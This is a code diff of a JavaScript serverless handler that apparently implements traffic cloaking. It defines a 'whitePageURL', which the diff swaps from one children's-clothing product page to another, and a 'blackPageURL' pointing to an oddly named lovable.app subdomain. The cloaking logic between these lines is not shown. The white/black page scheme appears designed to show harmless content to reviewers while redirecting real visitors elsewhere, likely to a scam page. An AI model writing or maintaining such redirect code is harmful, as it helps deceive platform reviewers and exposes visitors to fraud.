@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://bellabambini.net/collections/baby-girls/products/mabini-girls-beige-teddy-smock-dress?variant=56202762551676";
+    const whitePageURL = "https://purebaby.com.au/products/check-overall-multi-check";
     const blackPageURL = "https://csshhhggot.lovable.app";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
